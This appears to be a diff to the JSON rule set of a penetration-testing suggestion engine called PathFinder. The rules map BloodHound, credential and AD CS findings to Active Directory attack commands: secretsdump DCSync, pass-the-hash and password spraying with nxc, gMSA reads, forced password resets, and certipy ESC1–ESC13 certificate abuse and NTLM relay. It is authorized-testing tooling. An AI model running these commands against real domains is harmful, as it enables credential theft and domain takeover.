@@ -1,18 +1,149 @@
 [
     {
+        "_comment": "=== BOUNDED BLOODHOUND OWNERSHIP CORRELATION (direct edges only) ===",
+        "name": "OWNED ZERO-HOP - DCSync Now",
+        "priority": 100,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "bloodhound_owned_zero_hop_dcsync" } }
+        ],
+        "suggestion": {
+            "description": "ZERO-HOP: {trigger.1.attributes.description}",
+            "rationale": "The DCSync principal is already backed by credential material PathFinder owns. No graph traversal or additional takeover is required.",
+            "commands": [
+                "impacket-secretsdump '{trigger.1.host}/{trigger.1.attributes.owned_principal}:<PASSWORD>@<DC_IP>' -just-dc-ntlm",
+                "impacket-secretsdump -hashes :<NT_HASH> '{trigger.1.host}/{trigger.1.attributes.owned_principal}@<DC_IP>' -just-dc-ntlm"
+            ]
+        }
+    },
+    {
+        "name": "OWNED ZERO-HOP - Read gMSA Password Now",
+        "priority": 100,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "bloodhound_owned_zero_hop_gmsa_read" } }
+        ],
+        "suggestion": {
+            "description": "ZERO-HOP: {trigger.1.attributes.description}",
+            "rationale": "The owned principal directly holds ReadGMSAPassword over the target gMSA, enabling immediate credential retrieval without traversing another graph edge.",
+            "commands": [
+                "nxc ldap <DC_IP> -u '{trigger.1.attributes.owned_principal}' -p '<PASSWORD>' --gmsa",
+                "Recover the NT hash for '{trigger.1.attributes.target}', then add it back to PathFinder as an NTLM credential"
+            ]
+        }
+    },
+    {
+        "name": "OWNED ZERO-HOP - Vulnerable AD CS Enrollment",
+        "priority": 100,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "bloodhound_owned_zero_hop_adcs" } }
+        ],
+        "suggestion": {
+            "description": "ZERO-HOP: {trigger.1.attributes.description}",
+            "rationale": "PathFinder correlated an owned principal with enrollment rights on a template already identified as vulnerable. Validate the exact ESC conditions before requesting a certificate.",
+            "commands": [
+                "certipy find -u '{trigger.1.attributes.owned_principal}@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -enabled -vulnerable",
+                "certipy req -u '{trigger.1.attributes.owned_principal}@{trigger.1.host}' -p '<PASSWORD>' -ca <CA_NAME> -template '{trigger.1.attributes.target}' <ESC_SPECIFIC_OPTIONS>"
+            ]
+        }
+    },
+    {
+        "name": "OWNED ONE-HOP - Take Over High-Value Principal",
+        "priority": 99,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "bloodhound_owned_one_hop_high_value" } }
+        ],
+        "suggestion": {
+            "description": "ONE-HOP: {trigger.1.attributes.description}",
+            "rationale": "This is the only look-ahead PathFinder performs: the directly controlled target is already high value. PathFinder does not traverse any outgoing edge from that target.",
+            "commands": [
+                "Use the '{trigger.1.attributes.right}' technique from '{trigger.1.attributes.owned_principal}' against '{trigger.1.attributes.target}'",
+                "Validate the target context: {trigger.1.attributes.target_high_value_contexts}",
+                "Stop and re-ingest newly recovered credentials; no transitive path was assumed"
+            ]
+        }
+    },
+    {
+        "name": "OWNED DIRECT EDGE - ACL Abuse Now",
+        "priority": 97,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "bloodhound_owned_acl_edge" } }
+        ],
+        "suggestion": {
+            "description": "DIRECT EDGE: {trigger.1.attributes.description}",
+            "rationale": "The ACE principal matches credential material PathFinder owns, so this is actionable now rather than a hypothetical BloodHound edge.",
+            "commands": [
+                "If ForceChangePassword: bloodyAD -d '{trigger.1.host}' --host <DC_IP> -u '{trigger.1.attributes.owned_principal}' -p '<PASSWORD>' set password '{trigger.1.attributes.target}' '<NEW_PASSWORD>'",
+                "If AddMember/GenericAll on a group: add the owned principal to '{trigger.1.attributes.target}'",
+                "If WriteDacl/WriteOwner: grant only the minimum controlled right required, then verify and record the change"
+            ]
+        }
+    },
+    {
+        "name": "OWNED DIRECT EDGE - Delegation Abuse Now",
+        "priority": 98,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "bloodhound_owned_delegation_edge" } }
+        ],
+        "suggestion": {
+            "description": "DIRECT EDGE: {trigger.1.attributes.description}",
+            "rationale": "The delegation source is an owned user or machine account. This is a direct correlation only; no downstream delegation chain was searched.",
+            "commands": [
+                "Confirm the '{trigger.1.attributes.right}' relationship from '{trigger.1.attributes.owned_principal}' to '{trigger.1.attributes.target}'",
+                "For AllowedToAct/RBCD: request an impersonation service ticket for the target with the owned principal",
+                "For AllowedToDelegate: request only a service ticket covered by the recorded delegation SPN"
+            ]
+        }
+    },
+    {
         "_comment": "=== CREDENTIAL REUSE (highest priority - instant wins) ===",
         "name": "Credential Reuse on Login Service",
         "priority": 98,
         "triggers": [
-            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "host_scope": "any_host" },
+            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "attributes_match": { "credential_usage": "password_reuse" }, "host_scope": "any_host" },
             { "id": 2, "entity_type": "service", "name_match": { "type": "regex", "value": "(ssh|ftp|rdp|ms-wbt-server|winrm|smb|microsoft-ds)" } }
         ],
         "suggestion": {
             "description": "Credential for '{trigger.1.name}' can be tested against '{trigger.2.name}' on {trigger.2.host}:{trigger.2.port}.",
-            "rationale": "Credential reuse is the highest-yield attack in OSCP labs. Always spray found credentials against every login service.",
+            "rationale": "A recovered cleartext password can be tested against compatible login services with lockout awareness.",
             "commands": [
-                "nxc <PROTOCOL> <TARGET> -u '<USERNAME>' -p '<PASSWORD>'",
-                "nxc smb <TARGET> -u '<USERNAME>' -H '<NTLM_HASH>'  # hash-only credentials"
+                "nxc <PROTOCOL> <TARGET> -u '<USERNAME>' -p '<PASSWORD>'"
+            ]
+        }
+    },
+    {
+        "name": "Pass-the-Hash on Windows Login Service",
+        "priority": 97,
+        "triggers": [
+            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "attributes_match": { "credential_usage": "pass_the_hash" }, "host_scope": "any_host" },
+            { "id": 2, "entity_type": "service", "name_match": { "type": "regex", "value": "(winrm|smb|microsoft-ds)" } }
+        ],
+        "suggestion": {
+            "description": "NT hash for '{trigger.1.name}' can be tested against '{trigger.2.name}' on {trigger.2.host}:{trigger.2.port}.",
+            "rationale": "This is NT/NTLM account material with the shape required for pass-the-hash; challenge-response captures and crack-only formats are excluded.",
+            "commands": [
+                "nxc <PROTOCOL> <TARGET> -u '<USERNAME>' -H '<NTLM_HASH>'"
+            ]
+        }
+    },
+    {
+        "name": "Credential Hash Requires Cracking",
+        "priority": 90,
+        "host_scope": "any_host",
+        "triggers": [
+            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "attributes_match": { "credential_usage": "crack_first" }, "host_scope": "any_host" }
+        ],
+        "suggestion": {
+            "description": "Recovered {trigger.1.attributes.hash_type} material for '{trigger.1.name}' must be cracked or otherwise resolved before password reuse.",
+            "rationale": "NetNTLMv2, AS-REP, TGS, DCC2, and DPAPI material is not a reusable NT hash and must never be sent to pass-the-hash tooling.",
+            "commands": [
+                "Identify the correct john/hashcat format and mode for: {trigger.1.attributes.hash_type}",
+                "hashcat -m <HASH_MODE> '<HASH>' <WORDLIST>",
+                "After recovery, record the plaintext as a password credential before login testing"
             ]
         }
     },
@@ -20,7 +151,7 @@
         "name": "Credential Reuse on Web Login Page",
         "priority": 95,
         "triggers": [
-            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "host_scope": "any_host" },
+            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "attributes_match": { "credential_usage": "password_reuse" }, "host_scope": "any_host" },
             { "id": 2, "entity_type": "web_content", "name_match": { "type": "regex", "value": "(login|signin|auth|admin|user|account|portal|wp-login)" } }
         ],
         "suggestion": {
@@ -37,7 +168,7 @@
         "name": "Credential Access to SMB Share",
         "priority": 92,
         "triggers": [
-            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "host_scope": "any_host" },
+            { "id": 1, "entity_type": "credential", "name_match": { "type": "regex", "value": ".*" }, "attributes_match": { "credential_usage": "password_reuse" }, "host_scope": "any_host" },
             { "id": 2, "entity_type": "share", "name_match": { "type": "regex", "value": ".*" } }
         ],
         "suggestion": {
@@ -1144,6 +1275,9 @@
         "name": "DCSync Rights - Dump All Domain Hashes",
         "priority": 97,
         "host_scope": "same_host",
+        "suppress_if_host_has": [
+            { "entity_type": "privilege_escalation", "name_regex": "^bloodhound_owned_zero_hop_dcsync$" }
+        ],
         "triggers": [
             { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "dcsync_rights_found" } }
         ],
@@ -1162,6 +1296,9 @@
         "name": "GenericWrite/GenericAll on High-Value Group",
         "priority": 93,
         "host_scope": "same_host",
+        "suppress_if_host_has": [
+            { "entity_type": "privilege_escalation", "name_regex": "^bloodhound_owned_(?:acl_edge|one_hop_high_value)$" }
+        ],
         "triggers": [
             { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "genericwrite_on_sensitive_group" } }
         ],
@@ -1180,6 +1317,9 @@
         "name": "ACL Abuse Right - ForceChangePassword / WriteDacl / WriteOwner",
         "priority": 89,
         "host_scope": "same_host",
+        "suppress_if_host_has": [
+            { "entity_type": "privilege_escalation", "name_regex": "^bloodhound_owned_(?:acl_edge|one_hop_high_value|zero_hop_gmsa_read)$" }
+        ],
         "triggers": [
             { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "acl_abuse_right_on_object" } }
         ],
@@ -1220,6 +1360,9 @@
         "name": "Resource-Based Constrained Delegation (RBCD) Abuse",
         "priority": 87,
         "host_scope": "same_host",
+        "suppress_if_host_has": [
+            { "entity_type": "privilege_escalation", "name_regex": "^bloodhound_owned_(?:delegation_edge|one_hop_high_value)$" }
+        ],
         "triggers": [
             { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "resource_based_constrained_delegation_possible" } }
         ],
@@ -1293,22 +1436,156 @@
         }
     },
     {
-        "name": "AD CS Vulnerable Certificate Template (ESC)",
-        "priority": 93,
+        "name": "AD CS ESC1 - Arbitrary Principal Certificate",
+        "priority": 96,
         "host_scope": "same_host",
         "triggers": [
-            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "regex", "value": "^adcs_esc" } }
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "adcs_esc1" }, "attributes_match": { "esc": "ESC1" } }
         ],
         "suggestion": {
-            "description": "AD CS misconfiguration {trigger.1.attributes.esc} on template '{trigger.1.attributes.template}' ({trigger.1.host}).",
-            "rationale": "Vulnerable certificate templates allow privilege escalation to Domain Admin by requesting a certificate as a privileged user. ESC1/ESC4 are the most common and reliable.",
+            "description": "ESC1 is present on template '{trigger.1.attributes.template}' in {trigger.1.host}: the requester can supply another principal in an authentication certificate.",
+            "rationale": "An eligible enrollee can request a client-authentication certificate containing a privileged UPN and SID, then authenticate as that principal. Confirm the listed enrollment principal applies to your owned identity before requesting.",
             "commands": [
-                "Review: {trigger.1.attributes.description}",
-                "Request as admin (ESC1): certipy req -u '<user>@{trigger.1.host}' -p '<pass>' -ca <CA> -template '{trigger.1.attributes.template}' -upn Administrator@{trigger.1.host}",
-                "Authenticate: certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
-                "Pass-the-Hash / -ticket with the recovered NT hash or TGT"
+                "Review eligibility and issuance controls: {trigger.1.attributes.description}; enrollable principals: {trigger.1.attributes.enrollment_principals}",
+                "Resolve the target SID: certipy account -u '<USER>@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -user 'Administrator' read",
+                "Request: certipy req -u '<USER>@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -target <CA_HOST> -ca <CA_NAME> -template '{trigger.1.attributes.template}' -upn 'Administrator@{trigger.1.host}' -sid <ADMIN_SID>",
+                "Authenticate: certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"
             ],
-            "references": ["https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html"]
+            "references": ["https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication"]
+        }
+    },
+    {
+        "name": "AD CS ESC3 - Enrollment Agent Impersonation",
+        "priority": 92,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "adcs_esc3" }, "attributes_match": { "esc": "ESC3" } }
+        ],
+        "suggestion": {
+            "description": "Template '{trigger.1.attributes.template}' in {trigger.1.host} can issue a Certificate Request Agent certificate.",
+            "rationale": "ESC3 is a two-template chain: first obtain an enrollment-agent certificate, then use it with an eligible target template to request on behalf of a privileged user. The agent finding alone does not prove a usable target template.",
+            "commands": [
+                "Review agent-template eligibility: {trigger.1.attributes.description}; enrollable principals: {trigger.1.attributes.enrollment_principals}",
+                "Request the agent certificate: certipy req -u '<USER>@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -target <CA_HOST> -ca <CA_NAME> -template '{trigger.1.attributes.template}'",
+                "Identify an enabled ESC3 target template in the Certipy output before continuing",
+                "Request on behalf of the target: certipy req -u '<USER>@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -target <CA_HOST> -ca <CA_NAME> -template <TARGET_TEMPLATE> -on-behalf-of '{trigger.1.host}\\Administrator' -pfx <AGENT_PFX>",
+                "Authenticate: certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"
+            ],
+            "references": ["https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template"]
+        }
+    },
+    {
+        "name": "AD CS ESC4 - Certificate Template Takeover",
+        "priority": 94,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "adcs_esc4" }, "attributes_match": { "esc": "ESC4" } }
+        ],
+        "suggestion": {
+            "description": "Dangerous control rights were identified over certificate template '{trigger.1.attributes.template}' in {trigger.1.host}.",
+            "rationale": "ESC4 permits changing a published template into an ESC1-like configuration. This mutates Active Directory; confirm the template is enabled, retain the automatic backup, and restore the original configuration after the authorized test.",
+            "commands": [
+                "Confirm the exact controllable rights and publication state: {trigger.1.attributes.description}",
+                "Authorized state change: certipy template -u '<USER>@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -template '{trigger.1.attributes.template}' -write-default-configuration",
+                "Request through the modified template using the ESC1 workflow and authenticate with the resulting PFX",
+                "Restore immediately: certipy template -u '<USER>@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -template '{trigger.1.attributes.template}' -write-configuration <SAVED_CONFIGURATION_JSON>"
+            ],
+            "references": ["https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking"]
+        }
+    },
+    {
+        "name": "AD CS ESC6 - Conditional SAN Impersonation Chain",
+        "priority": 82,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "adcs_esc6" }, "attributes_match": { "esc": "ESC6" } }
+        ],
+        "suggestion": {
+            "description": "The CA '{trigger.1.attributes.template}' permits requester-supplied SAN attributes (ESC6).",
+            "rationale": "On patched domains ESC6 alone is normally insufficient because the SID security extension wins certificate mapping. Treat this as actionable only when Certipy also reports ESC9 or ESC16, or when the domain's certificate-binding posture is demonstrably legacy.",
+            "commands": [
+                "Review the CA evidence and prerequisites: {trigger.1.attributes.description}",
+                "Correlate this CA with ESC9 templates or ESC16 before attempting impersonation",
+                "Conditional request: certipy req -u '<USER>@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -target <CA_HOST> -ca '{trigger.1.attributes.template}' -template <ESC9_OR_CLIENT_AUTH_TEMPLATE> -upn 'Administrator@{trigger.1.host}' -sid <ADMIN_SID>",
+                "Authenticate only if the issued certificate omits the requester's SID security extension: certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"
+            ],
+            "references": ["https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc6-ca-allows-san-specification-via-request-attributes"]
+        }
+    },
+    {
+        "name": "AD CS ESC8 - Relay to Web Enrollment",
+        "priority": 95,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "adcs_esc8" }, "attributes_match": { "esc": "ESC8" } }
+        ],
+        "suggestion": {
+            "description": "CA '{trigger.1.attributes.template}' exposes relayable AD CS web enrollment (ESC8).",
+            "rationale": "HTTP enrollment, or HTTPS enrollment without Extended Protection for Authentication, can accept a relayed privileged NTLM authentication and issue a certificate. Coercion and relay are active operations and must remain operator-controlled.",
+            "commands": [
+                "Confirm the HTTP/HTTPS and EPA evidence: {trigger.1.attributes.description}",
+                "Start the authorized relay: certipy relay -target 'https://<CA_HOST>' -template 'DomainController'",
+                "Coerce an in-scope privileged machine account to the relay listener using the engagement-approved method",
+                "Authenticate with the issued PFX: certipy auth -pfx <DC_ACCOUNT_PFX> -dc-ip <DC_IP>"
+            ],
+            "references": ["https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment"]
+        }
+    },
+    {
+        "name": "AD CS ESC11 - Relay to RPC Enrollment",
+        "priority": 95,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "adcs_esc11" }, "attributes_match": { "esc": "ESC11" } }
+        ],
+        "suggestion": {
+            "description": "CA '{trigger.1.attributes.template}' does not enforce encryption for RPC certificate requests (ESC11).",
+            "rationale": "The unprotected ICPR/RPC enrollment interface can accept relayed NTLM authentication. Unlike ESC8, RPC relay requires the CA name. Coercion and relay remain explicit operator actions.",
+            "commands": [
+                "Confirm the RPC encryption evidence: {trigger.1.attributes.description}",
+                "Start the authorized RPC relay: certipy relay -target 'rpc://<CA_HOST>' -ca '{trigger.1.attributes.template}' -template 'DomainController'",
+                "Coerce an in-scope privileged machine account to the relay listener using the engagement-approved method",
+                "Authenticate with the issued PFX: certipy auth -pfx <DC_ACCOUNT_PFX> -dc-ip <DC_IP>"
+            ],
+            "references": ["https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc11-ntlm-relay-to-ad-cs-rpc-interface"]
+        }
+    },
+    {
+        "name": "AD CS ESC13 - Issuance Policy Group Escalation",
+        "priority": 94,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "adcs_esc13" }, "attributes_match": { "esc": "ESC13" } }
+        ],
+        "suggestion": {
+            "description": "Template '{trigger.1.attributes.template}' in {trigger.1.host} carries an issuance policy linked to an AD group (ESC13).",
+            "rationale": "When an eligible principal enrolls and authenticates with this certificate, the KDC can add the issuance-policy-linked group SID to the resulting token. Validate that the linked group is privileged and that your identity can enroll.",
+            "commands": [
+                "Enumerate the linked issuance-policy group: certipy find -u '<USER>@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -enabled -vulnerable -oids",
+                "Review eligibility and linked-group evidence: {trigger.1.attributes.description}; enrollable principals: {trigger.1.attributes.enrollment_principals}",
+                "Request: certipy req -u '<USER>@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -target <CA_HOST> -ca <CA_NAME> -template '{trigger.1.attributes.template}'",
+                "Authenticate and verify the resulting group membership: certipy auth -pfx <CERTIFICATE_PFX> -dc-ip <DC_IP>"
+            ],
+            "references": ["https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked"]
+        }
+    },
+    {
+        "name": "AD CS ESC - Technique-Specific Manual Validation",
+        "priority": 88,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "regex", "value": "^adcs_esc(?!(?:1|3|4|6|8|11|13)$)" } }
+        ],
+        "suggestion": {
+            "description": "Certipy reported {trigger.1.attributes.esc} on '{trigger.1.attributes.template}' in {trigger.1.host}.",
+            "rationale": "This ESC technique has prerequisites or mapping behavior that should be validated from the complete Certipy output before choosing an exploitation workflow. PathFinder does not substitute an ESC1 command for a different technique.",
+            "commands": [
+                "Review the original evidence: {trigger.1.attributes.description}",
+                "Re-enumerate full context: certipy find -u '<USER>@{trigger.1.host}' -p '<PASSWORD>' -dc-ip <DC_IP> -enabled -vulnerable -oids",
+                "Confirm enrollment/control principals: {trigger.1.attributes.enrollment_principals}",
+                "Follow the {trigger.1.attributes.esc} technique-specific validation workflow only after its prerequisites are present"
+            ],
+            "references": ["https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation"]
         }
     },
     {
